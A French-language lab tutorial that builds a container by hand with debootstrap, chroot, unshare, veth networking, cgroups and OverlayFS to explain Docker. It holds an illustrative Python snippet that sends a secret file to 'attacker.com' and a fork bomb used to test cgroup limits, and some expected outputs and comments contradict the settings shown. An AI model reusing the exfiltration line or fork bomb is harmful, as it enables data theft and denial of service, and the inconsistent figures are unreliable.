# Labo Docker

Bien que Docker n'est à proprement parler pas un chapitre de la programmation concurrente, de nombreux problèmes de concurrences sont aujourd'hui résolus en utilsant des conteneurs avec des services isolés.

Dans ce travail pratique nous allons explorer les fondement de Docker, comment il fonctionne sous le capot, puis comment utiliser Docker pour créer des conteneurs et les faire communiquer entre eux.

## Docker c'est quoi ?

Docker est une plateforme apparue en 2013 qui permet de créer, déployer et gérer des applications dans des conteneurs.

Un conteneur est une unité légère et portable qui contient tout ce dont une application a besoin pour fonctionner, y compris le code, les bibliothèques, les dépendances et les configurations.

Contrairement à un processus qui n'est qu'un exécutable avec une mémoire isolée, un conteneur est tout un environnement d'exécution complet qui peut être facilement déplacé entre différents systèmes. Un container se comporte comme un vrai système d'exploitation, mais il partage le noyau de l'hôte avec d'autres conteneurs, ce qui le rend plus léger que les machines virtuelles traditionnelles qui doivent être démarrées avec leur propre système d'exploitation.

Docker offre en plus une grande flexibilité de gestion et de création d'images qui sont des descriptions de conteneurs. Les images Docker sont construites à partir de fichiers de configuration appelés Dockerfiles, qui définissent les étapes nécessaires pour créer une image à partir d'une base d'image existante.

Tout développeur utilise Docker au quotidien pour créer des environnements de développement, tester des applications dans des environnements isolés, et déployer des applications dans des environnements de production.

## Isoler, le maître mot de la conteneurisation

Dans tout logiciel ou développement, les questions de sécurité, soit pour protéger les données, soit pour éviter les conflits entre différentes applications, sont primordiales. On peut citer plusieurs niveaux d'isolation

- Isolation mémoire : un processus ne peut pas accéder à la mémoire d'un autre processus, c'est natif du système d'exploitation
- Isolation de processus : les processus sont isolés les uns des autres, ils ne peuvent pas interférer directement les uns avec les autres, même via des signaux, des pipes ou de la mémoire partagée.
- Isolation de réseau : un processus ne peut pas accéder au réseau, communiquer librement sur internet ou même communiquer avec d'autres processus sur le même hôte, à moins que cela ne soit explicitement autorisé.
- Isolation de système de fichiers : un processus ne peut pas accéder au système de fichiers de l'hôte ou à d'autres processus, à moins que cela ne soit explicitement autorisé.
- Isolation de ressources : un processus ne peut pas accéder aux ressources système telles que les CPU, la mémoire, les disques, etc. à moins que cela ne soit explicitement autorisé.
- Isolation de l'environnement d'exécution : un processus ne peut pas accéder à l'environnement d'exécution d'un autre processus, y compris les variables d'environnement, les fichiers de configuration, etc.
- Isolation de l'utilisateur : un processus ne peut pas accéder aux ressources ou aux données d'un autre utilisateur, à moins que cela ne soit explicitement autorisé.

## Créer un conteneur à la main

### Prérequis

Ce tutorial est prévu pour être réalisé sur WSL2 avec Ubuntu, mais il peut être réalisé sur n'importe quelle distribution Linux, pour autant que le noyau Linux soit à jour et supporte les fonctionnalités nécessaires pour la conteneurisation, telles que les `cgroups` et les `namespaces`.

### Installation des outils nécessaires

Débutons notre tutorial en obtenant les outils nécessaires:

```bash
sudo apt update
sudo apt install -y debootstrap util-linux iproute2 iputils-ping procps mount
```

debootstrap
: C'est un outil qui permet de créer un système de fichiers de base pour une distribution Linux. Il permet de télécharger et d'installer les paquets nécessaires pour construire un système de fichiers minimal pour une distribution Linux spécifique.

util-linux
: C'est une collection d'outils de base pour la gestion du système Linux. Il comprend des outils pour la gestion des partitions, des systèmes de fichiers, des processus, des utilisateurs, des groupes, des périphériques, etc.

iproute2
: C'est une suite d'outils pour la gestion du réseau sous Linux. Il comprend des outils pour la configuration des interfaces réseau, la gestion des routes, la surveillance du trafic réseau, etc.

iputils-ping
: C'est un ensemble d'outils pour tester la connectivité réseau. Il comprend des outils tels que ping, traceroute, etc.

procps
: C'est une collection d'outils pour la gestion des processus sous Linux. Il comprend des outils pour la surveillance des processus, la gestion de la mémoire, la gestion des utilisateurs, etc

mount
: C'est un outil pour monter et démonter des systèmes de fichiers sous Linux. Il permet de monter des systèmes de fichiers locaux ou distants, de les démonter, de les vérifier, etc.

### Créer un système de fichiers pour le conteneur

Créons deux variables d'environnement pour stocker le chemin du système de fichiers de notre conteneur et le nom de la distribution que nous allons utiliser pour construire notre conteneur. Ici nous allons nous baser sur la même distribution que celle de notre hôte (probablement Ubuntu 24.04 chez vous).

```bash
ROOTFS=$HOME/mycontainer-rootfs
CODENAME=$(. /etc/os-release && echo "$VERSION_CODENAME")
```

Le conteneur sera construit dans votre répertoire personnel dans le dossier `mycontainer-rootfs`.

Le fichier `/etc/os-release` contient des informations sur la distribution Linux en cours d'exécution, y compris le nom de la distribution, sa version, son ID, etc. En utilisant la commande `source` (ou `.`) pour charger ce fichier dans l'environnement de votre shell, vous pouvez accéder à ces variables d'environnement et les utiliser dans vos scripts ou commandes.

Chez moi, `os-release` contient les informations suivantes :

```bash
$ cat /etc/os-release
PRETTY_NAME="Ubuntu 24.04.3 LTS"
NAME="Ubuntu"
VERSION_ID="24.04"
VERSION="24.04.3 LTS (Noble Numbat)"
VERSION_CODENAME=noble
ID=ubuntu
ID_LIKE=debian
```

D'abord on crée le dossier qui contiendra le système de fichiers de notre conteneur:

```bash
sudo mkdir -p "$ROOTFS"
```

Puis on demande à `debootstrap` de construire un système de fichiers minimal pour la distribution courante dans le dossier `$ROOTFS`:

```bash
sudo debootstrap --variant=minbase "$CODENAME" "$ROOTFS" http://archive.ubuntu.com/ubuntu/
```

Prenons un peu de temps pour bien comprendre ce que `debootstrap` est en train de faire. Il se connecte au dépôt de paquets d'Ubuntu, télécharge les paquets nécessaires pour construire un système de fichiers minimal. La première étape est le téléchargement du fichier `InRelease` qui contient des informations sur les paquets disponibles dans le dépôt, ainsi que la signature de ce fichier pour vérifier son authenticité. C'est important pour éviter les attaques de type "man-in-the-middle" où un attaquant pourrait intercepter la connexion et fournir des paquets malveillants. On compare la signature du fichier `InRelease` avec la clé publique de l'archive pour s'assurer que le fichier est authentique.

```text
I: Retrieving InRelease
I: Checking Release signature
I: Valid Release signature (key id F6ECB3762474EDA9D21B7022871920D1991BC93C)
I: Retrieving Packages
I: Validating Packages
I: Resolving dependencies of required packages...
I: Resolving dependencies of base packages...
I: Checking component main on http://archive.ubuntu.com/ubuntu...
I: Retrieving apt 2.7.14build2
I: Validating apt 2.7.14build2
...
I: Extracting zlib1g...
I: Installing core packages...
I: Unpacking required packages...
..
I: Unpacking ubuntu-keyring...
I: Configuring the base system...
...
I: Configuring apt...
I: Configuring libc-bin...
I: Base system installed successfully.
```

Vous pouvez ensuite explorer le système de fichiers du conteneur en naviguant dans le dossier `$ROOTFS`:

```bash
$ ls $ROOTFS
bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var

$ ls -al $ROOTFS/usr/bin/bash
-rwxr-xr-x 1 root root 1446024 Mar 31  2024 /home/ycr/mycontainer-rootfs/usr/bin/bash

$ ls -al $ROOTFS/dev/std*
lrwxrwxrwx 1 root root 15 Apr 20 13:27 /home/ycr/mycontainer-rootfs/dev/stderr -> /proc/self/fd/2
lrwxrwxrwx 1 root root 15 Apr 20 13:27 /home/ycr/mycontainer-rootfs/dev/stdin -> /proc/self/fd/0
lrwxrwxrwx 1 root root 15 Apr 20 13:27 /home/ycr/mycontainer-rootfs/dev/stdout -> /proc/self/fd/1
```

On note que le système de fichier contient les applications de base comme `bash` et tous les dossiers standards d'un système linux. Les fichiers spéciaux dans `/dev` sont des liens symboliques vers le système de fichiers de l'hôte, ce qui signifie que les processus dans le conteneur pourront accéder à ces fichiers spéciaux pour communiquer avec l'hôte.

### Chrooter dans le conteneur

La commande `chroot` permet de changer le répertoire racine d'un processus et de ses enfants. Lorsque depuis un programme vous faites : `fopen('chemin', 'r')`, le système d'exploitation va interpréter ce chemin par rapport à votre répertoire racine. Un programme malveillant peut très bien essayer de lire des fichiers sensibles sur votre système en utilisant des chemins relatifs ou absolus, comme par exemple :

```python
secret = open('/home/boss/secret.txt', 'r').read() # Lecture du secret
request.get('http://attacker.com/leak?data=' + secret) # Envoi le secret à l'attaquant
```

En utilisant `chroot`, on peut isoler un processus dans un environnement de fichiers spécifique, ce qui empêche ce processus d'accéder à des fichiers en dehors de cet environnement. Par exemple, si nous chrootons dans notre conteneur, le processus ne pourra pas accéder aux fichiers de l'hôte, même s'il essaie d'utiliser des chemins absolus.

Essayez de chrooter dans le conteneur et d'exécuter `bash` pour avoir un shell dans le conteneur:

```bash
sudo chroot "$ROOTFS" /bin/bash
```

Puis essayez d'accéder à vos donnéses personnelles depuis le conteneur. Vous ne verrez pas votre utilisateur ni les fichiers de votre répertoire personnel, car le processus est isolé dans le système de fichiers du conteneur que nous avons créé avec `debootstrap` et qui ne contient pas les données de l'hôte.

```bash
$ ls /home
```

Utilisez `exit` pour sortir du conteneur et revenir à votre shell normal.

### Installer des applications dans le conteneur

Pour la suite on veut pouvoir accéder aux applications de base comme `ping` ou `ip` depuis le conteneur. De base `debootstrap` ne nous a installé que les applications de base, mais on peut facilement installer d'autres applications dans le conteneur en utilisant `chroot` pour exécuter des commandes d'installation à l'intérieur du conteneur.

```bash
sudo mount --bind /dev  "$ROOTFS/dev"
sudo mount --bind /sys  "$ROOTFS/sys"
sudo mount -t proc proc "$ROOTFS/proc"

sudo chroot "$ROOTFS" /bin/bash -c "apt update && apt install -y iputils-ping procps python3"

sudo umount "$ROOTFS/proc"
sudo umount "$ROOTFS/sys"
sudo umount "$ROOTFS/dev"
```

Notez qu'avec ceci nous n'avons que l'isolation du système de fichiers, mais pas l'isolation des processus, du réseau, etc. Nous allons voir comment ajouter ces autres niveaux d'isolation dans la suite du TP.

### Unshare

Sous Linux un espace de nom (`namespace`) est une fonctionnalité du noyau qui permet d'isoler les ressources système pour un groupe de processus. Chaque espace de nom fournit une vue isolée de certaines ressources système, telles que les processus, le réseau, le système de fichiers, etc. En utilisant des espaces de noms, on peut créer des environnements isolés pour les processus, ce qui est essentiel pour la conteneurisation.

La commande `unshare` permet de créer un nouvel espace de noms pour un processus, ce qui lui permet d'être isolé du reste du système. En utilisant `unshare`, on peut créer un environnement isolé pour un processus, ce qui est essentiel pour la conteneurisation. Par exemple, en utilisant `unshare` avec les options appropriées, on peut créer un environnement isolé pour les processus, le réseau, le système de fichiers, etc :

```bash
sudo unshare \
  --fork \
  --pid \
  --mount \
  --uts \
  --ipc \
  --net \
  --cgroup \
  --mount-proc \
  chroot "$ROOTFS" /bin/bash
```

| Option | Description |
| --- | --- |
| `--fork` | Fork le processus après avoir créé les espaces de noms. |
| `--pid` | Crée un nouvel espace de noms pour les processus, ce qui isole les processus du conteneur des processus de l'hôte. |
| `--mount` | Crée un nouvel espace de noms pour les systèmes de fichiers, ce qui isole le système de fichiers du conteneur de celui de l'hôte. |
| `--uts` | Crée un nouvel espace de noms pour les identifiants d'hôte, ce qui permet au conteneur d'avoir son propre nom d'hôte. |
| `--ipc` | Crée un nouvel espace de noms pour les communications inter-processus, ce qui isole les communications du conteneur de celles de l'hôte. |
| `--net` | Crée un nouvel espace de noms pour le réseau, ce qui isole le réseau du conteneur de celui de l'hôte. |
| `--cgroup` | Crée un nouvel espace de noms pour les groupes de contrôle, ce qui permet de limiter les ressources utilisées par le conteneur. |
| `--mount-proc` | Monte le système de fichiers `proc` dans le conteneur, ce qui permet aux processus dans le conteneur de voir les processus en cours d'exécution dans le conteneur. |

Notez que sous WSL2, le `--mount-proc` ne fonctionne pas toujours, car WSL2 utilise une implémentation personnalisée du noyau Linux qui ne supporte pas toutes les fonctionnalités de conteneurisation. Cependant, on peut toujours monter manuellement le système de fichiers `proc` dans le conteneur après l'avoir créé avec `unshare` comme nous l'avons fait précédemment.

Pour disposer de proc, une fois dans le conteneur, vous pouvez exécuter la commande suivante pour monter le système de fichiers `proc`:

```bash
mount -t proc proc /proc
```

On peut vérifier le degré d'isolation du conteneur en essayant d'accéder à des ressources de l'hôte.

D'abord les processus, depuis le conteneur, on ne voit que les processus qui s'exécutent dans le conteneur, pas les processus de l'hôte:

```bash
root@nb-8355:/# ps -ax
    PID TTY      STAT   TIME COMMAND
      1 ?        S      0:00 /bin/bash
     11 ?        R+     0:00 ps -ax
```

L'accès réseau est également isolé, depuis le conteneur, on ne peut pas accéder à internet ni aux services de l'hôte. C'est pourquoi on a installé `ping`, `iproute` sans isolation.

```bash
root@nb-8355:/# ip a
1: lo: <LOOPBACK> mtu 65536 qdisc noop state DOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
```

Pour sortir de l'environnement, c'est la même commande `exit` puisqu'on passe par `chroot`.

### Établir le réseau dans le conteneur

On l'a vu la commande `ip a` ne donne accès qu'à l'interface de loopback, ce qui signifie que le conteneur n'a pas d'accès réseau. Pour établir le réseau dans le conteneur, on peut utiliser la commande `ip` pour créer une interface virtuelle et la connecter à un pont réseau sur l'hôte. C'est le même principe utilisé par Docker pour connecter les conteneurs au réseau de l'hôte.

Concreètement on aimerait avoir ceci :

```text
[ conteneur veth1 ] <---> [ veth0 host ] ---> (NAT) ---> eth0 ---> Internet
```

Sous Linux on peut utiliser la commande `ip` pour créer des interfaces réseau virtuelle. C'est l'équivalent d'un connecteur RJ45 virtuel.

```bash
sudo ip link add veth0 type veth peer name veth1
```

On demande de créer un lien réseau nommé `veth0` et un autre lien nommé `veth1` qui est connecté à `veth0`. C'est comme si on avait deux câbles réseau connectés ensemble, ce qui permet de faire communiquer les processus dans le conteneur avec l'hôte:

```text
[veth0] <--- câble virtuel ---> [veth1]
```

Ensuite il faut connecter `veth1` au pont réseau de l'hôte:

```bash
sudo ip link set veth1 netns "$CONTPID"
```

Par contre on a besoin du PID du processus dans le conteneur pour connecter `veth1` au pont réseau de l'hôte.

1. Démarrez votre conteneur avec `unshare` et `chroot` comme vu précédemment.
2. Ouvrez un autre terminal et utilisez la commande suivante:

    ```bash
    $ pstree -p $(pgrep -f "chroot $ROOTFS" | head -1)
    sudo(123921)───sudo(123922)───unshare(123923)───bash(123924)
    ```

    On voit la chaîne de processus qui a été créée pour le conteneur. Dans cet exemple 123924 est le PID du processus `bash` qui s'exécute dans le conteneur, qui depuis le conteneur est vu comme le pid 1. C'est ce PID que nous allons utiliser pour connecter `veth1` au pont réseau de l'hôte.
3. Exécutez la commande suivante pour connecter `veth1` au pont réseau de l'hôte:

    ```bash
    sudo ip link set veth1 netns 123924
    ```

    `netns` est l'option pour spécifier le namespace dans lequel on veut connecter l'interface `veth1`. Rappelez-vous qu'un namespace est connecté à un processus.
4. Vérifiez que `veth1` est bien connecté au pont réseau de l'hôte en exécutant la commande suivante dans le conteneur:

    ```bash
    ip a
    ```

    Vous devriez voir une nouvelle interface `veth1` dans la liste des interfaces réseau du conteneur, ce qui signifie que le conteneur est maintenant connecté au réseau de l'hôte.

Maintenant on dispose d'un processus isolé dans un conteneur avec un système de fichiers isolé et un réseau isolé, ce qui est la base de la conteneurisation.

Néanmoins il n'y a pas de réseau puisque nous n'avons pas configuré d'adresse IP pour l'interface `veth1` dans le conteneur, ni de pont réseau sur l'hôte pour connecter `veth1` à internet.

Les intefaces réseau sont *down* par défaut il faut les activer dans l'hôte et dans le conteneur:

```bash
# Dans l'hôte
sudo ip link set veth0 up

# Dans le conteneur
ip link set veth1 up
```

Puis on peut configurer une adresse IP pour `veth0` dans l'hôte:

```bash
# Dans l'hôte
sudo ip addr add 10.200.1.1/24 dev veth0

# Dans le conteneur
ip addr add 10.200.1.2/24 dev veth1
```

Bravo ! Nous venons d'établir proprement le lien réseau. On peut tester avec `ping` depuis le conteneur pour vérifier que le réseau fonctionne:

```bash
$ ping -c 10.200.1.2
PING 10.200.1.1 (10.200.1.1) 56(84) bytes of data.
64 bytes from 10.200.1.1: icmp_seq=1 ttl=64 time=0.135 ms
64 bytes from 10.200.1.1: icmp_seq=2 ttl=64 time=0.058 ms
```

Néanmoins toujours impossible d'accéder à internet depuis le conteneur:

```bash
$ ping -c 8.8.8.8
ping: connect: Network is unreachable
```

On veut activer le routage via la carte réseau du conainter avec

```bash
ip route add default via 10.200.1.1
```

Depuis l'hôte il faut activer le forwarding IP pour permettre à une interface réseau de faire du routage entre différentes interfaces réseau. C'est l'option qui est généralement activée sur les routeurs comme OpenWRT.

```bash
sudo sysctl -w net.ipv4.ip_forward=1
```

Ensuite il faut activer le masquerading pour permettre au trafic du conteneur de sortir sur internet en utilisant l'adresse IP de l'hôte:

```bash
sudo iptables -t nat -A POSTROUTING -s 10.200.1.0/24 -o eth0 -j MASQUERADE
```

Ici on configure la table NAT du firewall qui s'occupe de la translation d'adresse. Prenons l'exemple de monsieur Dupont dans l'entreprise ACME qui appelle madame Durant via le téléphone de son bureau. Monsieur Dupont à un numéro interne à l'entreprise, par exemple 1234. Si madame durant n'est pas là, il laisse un message vocal en lui disant de le reppaler au 1234. Evidemment ca ne marchera pas car le numéro 1234 n'est pas "public". Il faut que le standard téléphonique de l'entreprise fasse du "masquerading" pour que le numéro 1234 soit remplacé par le numéro public de l'entreprise, par exemple +41 21 322 12 34, pour que madame Durant puisse rappeler monsieur Dupont. Concrètement on dit:

Le service de translation d'adresse NAT doit ajouter une règle de traitement en POSTROUTING (post traitement), c'est à dire après que le paquet ait été traité par les règles de firewall, pour les paquets qui ont une adresse source dans le réseau. Les paquets ayant comme source `10.200.1.x` doivent être traités par la règle de masquerading, c'est à dire que leur adresse source doit être remplacée par l'adresse IP de l'interface `eth0` de l'hôte.

Notons que dans Docker, il y a une étape supplémentaire, celle d'un "pont". Plutôt que de configurer NAT sur tous les containers, on crée un pont réseau sur l'hôte, par exemple `docker0`, qui est connecté à tous les conteneurs. Ensuite on configure le masquerading pour que le trafic du pont `docker0` puisse sortir sur internet, ce qui permet à tous les conteneurs connectés au pont de bénéficier du NAT sans avoir à configurer le masquerading pour chaque conteneur individuellement.

## Cgroups

Les `cgroups` (control groups) sont une fonctionnalité du noyau Linux qui permet de limiter et de contrôler les ressources système utilisées par un groupe de processus. Les `cgroups` permettent de limiter l'utilisation du CPU, de la mémoire, du disque, du réseau, etc. pour un groupe de processus spécifique, ce qui est essentiel pour la conteneurisation. Par exemple, on peut utiliser les `cgroups` pour limiter l'utilisation du CPU d'un conteneur à 50% de la capacité totale du CPU, ou pour limiter l'utilisation de la mémoire d'un conteneur à 512 Mo. Les `cgroups` sont utilisés par Docker pour limiter les ressources utilisées par les conteneurs, ce qui permet de garantir que les conteneurs ne consomment pas plus de ressources que ce qui leur est alloué, et que les conteneurs ne peuvent pas interférer les uns avec les autres en consommant toutes les ressources disponibles sur l'hôte.

Sous WLS2 avec Ubuntu 24.04, les `cgroups` devraient être supportés nativement. On peut le tester avec :

```bash
$ mount | grep cgroup
cgroup on /sys/fs/cgroup type cgroup2 (rw,nosuid,nodev,noexec,relatime)
```

La première étape est de créer un groupe de contrôle pour notre conteneur et d'activer les contrôleurs de ressources que nous voulons utiliser pour limiter les ressources du conteneur. Par exemple, pour activer les contrôleurs de CPU, de mémoire, d'IO et de PIDs, on peut exécuter la commande suivante:

```bash
CG=/sys/fs/cgroup/demo-ctr
sudo mkdir -p "$CG"
echo "+cpu +memory +io +pids" | sudo tee /sys/fs/cgroup/cgroup.subtree_control
```

Puis pour notre contrôleur, on peut configurer les limites:

```bash
# Quotas CPU : 12% de la capacité totale du CPU,
# avec un burst de 50% pendant 100ms.
echo "12000 50000" | sudo tee "$CG/cpu.max"

# Limite mémoire : 256 Mo
echo "256M" | sudo tee "$CG/memory.max"

# Limite d'IO : 10 Mo/s en lecture et 5 Mo/s en écriture sur le disque /dev/sda
echo "10485760 5242880" | sudo tee "$CG/io.max"

# Limite de PIDs : 42 processus maximum
echo 42 | sudo tee "$CG/pids.max"
```

Puis on va attacher le processus du conteneur à ce groupe de contrôle pour que les limites soient appliquées au conteneur:

```bash
sudo echo "$CONTPID" | sudo tee "$CG/cgroup.procs"
```

Il est tant de tester depuis votre container.

```bash
[container]# :(){ :|:& };:     # fork bomb — sera arrêtée à 64 processus
[container]# stress --vm 1 --vm-bytes 512M   # OOM killed
[container]# stress --cpu 4    # throttlé à 50% d'un cœur
```

## Overlayfs

Un dernier point important pour comprendre le fonctionnement de Docker est la notion de système de fichiers en overlay. Docker utilise un système de fichiers en overlay pour permettre aux conteneurs d'avoir un système de fichiers isolé tout en partageant les mêmes fichiers de base avec l'hôte. Cela permet de réduire la taille des images Docker et d'améliorer les performances, car les conteneurs peuvent partager les mêmes fichiers de base sans avoir à les dupliquer.

Réalisons un exemple simple. On crée un dossier `overlay-demo` avec les sous-dossiers `lower`, `upper`, `work` et `merged`:

```text
$ mkdir -p overlay-demo/{lower,upper,work,merged}
$ tree overlay-demo
overlay-demo
├── lower
├── merged
├── upper
└── work
```

lower
: C'est le système de fichiers de base qui contient les fichiers partagés entre l'hôte et les conteneurs. Par exemple, on peut créer un fichier `hello.txt` dans le dossier `lower`:

merged
: C'est le système de fichiers en overlay qui combine les fichiers de `lower` et `upper`. C'est ce système de fichiers que les conteneurs vont utiliser pour accéder aux fichiers.

upper
: C'est le système de fichiers qui contient les modifications spécifiques à chaque conteneur. Par exemple, si un conteneur modifie le fichier `hello.txt`, cette modification sera enregistrée dans le dossier `upper`, ce qui permet de conserver les fichiers de base dans `lower` intacts.

work
: C'est un dossier de travail utilisé par le système de fichiers en overlay pour gérer les modifications entre `lower` et `upper`. Il est nécessaire pour que le système de fichiers en overlay puisse gérer les modifications de manière efficace.

On crée maintenant un fichier de base `hello.txt` dans le dossier `lower`:

```bash
echo "Hello Bob" > overlay-demo/lower/hello.txt
```

Jusqu'ici on n'a que des dossiers simples et aucune magie d'overlayfs. Maintenant on va monter le système de fichiers en overlay pour combiner les fichiers de `lower` et `upper` dans le dossier `merged`:

```bash
sudo mount -t overlay overlay -o lowerdir=overlay-demo/lower,\
    upperdir=overlay-demo/upper,\
    workdir=overlay-demo/work \
    overlay-demo/merged
```

Expliquons la commande. On appelle `mount` qui est utilisé habituellement pour monter un disque et le rendre disponible dans le *filesystem*. C'est la commande utilisée quand vous insérez une clé USB ou au démarrage de votre ordinateur pour monter le disque principal (SSD). Ici on utilise mount en utilisant `-t overlay` le type de système de fichiers que nous voulons monter, qui est un système de fichiers en overlay. Ensuite on spécifie les options `-o` pour indiquer les dossiers `lower`, `upper` et `work` qui sont utilisés pour le système de fichiers en overlay. Enfin on indique le point de montage `overlay-demo/merged` où le système de fichiers en overlay sera monté.

On doit avoir ceci :

```text
$ tree overlay-demo
overlay-demo
├── lower
│   └── hello.txt
├── merged
│   └── hello.txt
├── upper
└── work
    └── work  [error opening dir]
```

Modifions maintenant le fichier `hello.txt` dans le dossier `merged`:

```bash
echo "Hello Alice" > overlay-demo/merged/hello.txt
```

Une modification est apparue, mais elle n'est pas dans `lower` qui est le système de fichiers de base, mais dans `upper` qui est le système de fichiers des modifications locales.

```bash
$ tree overlay-demo
overlay-demo
├── lower
│   └── hello.txt
├── merged
│   └── hello.txt
├── upper
└── work
    └── work  [error opening dir]
```

Observez le contenu du fichier `hello.txt` dans les différents dossiers.

On pourrait mener l'expérience plus loin et simuler plusieurs couches. OverlayFS supporte plusieurs lower (`-o lowerdir=layer3:layer2:layer1`) ce qui permet de faire du copy-on-write à plusieurs niveaux, c'est à dire que les modifications sont enregistrées dans la couche la plus haute, mais les fichiers de base peuvent être partagés entre plusieurs conteneurs.

## Nettoyage

La partie expérimentale de ce TP est maintenant terminée, il est temps de nettoyer les ressources que nous avons créées:

```bash
sudo umount "$ROOTFS/proc"
sudo umount "$ROOTFS/sys"
sudo umount "$ROOTFS/dev"
sudo rm -rf "$ROOTFS"
```

Suppression des intefaces réseaux, il suffit d'un côté pour supprimer les deux interfaces `veth0` et `veth1`:

```bash
sudo ip link delete veth0
```

## Conclusion

Dans ce travail pratique, nous avons exploré les fonctionnalités de base offertes par le noyau Linux pour permettre le fonctionnement de Docker.

1. OverlayFS pour le système de fichiers en overlay qui permet aux conteneurs de partager les mêmes fichiers de base tout en ayant des modifications spécifiques à chaque conteneur.
2. Cgroups pour limiter les ressources utilisées par les conteneurs, ce qui permet de garantir que les conteneurs ne consomment pas plus de ressources que ce qui leur est alloué, et que les conteneurs ne peuvent pas interférer les uns avec les autres en consommant toutes les ressources disponibles sur l'hôte.
3. Namespaces pour isoler les processus, le réseau, le système de fichiers, etc. des conteneurs du reste du système, ce qui est essentiel pour la conteneurisation.
4. Chroot pour isoler le système de fichiers du conteneur du système de fichiers de l'hôte, ce qui permet de garantir que les processus dans le conteneur ne peuvent pas accéder aux fichiers de l'hôte.
5. Unshare pour créer un environnement isolé pour les processus dans le conteneur, ce qui est essentiel pour la conteneurisation.
6. Configuration du réseau pour permettre aux conteneurs d'accéder à internet tout en étant isolés du réseau de l'hôte.
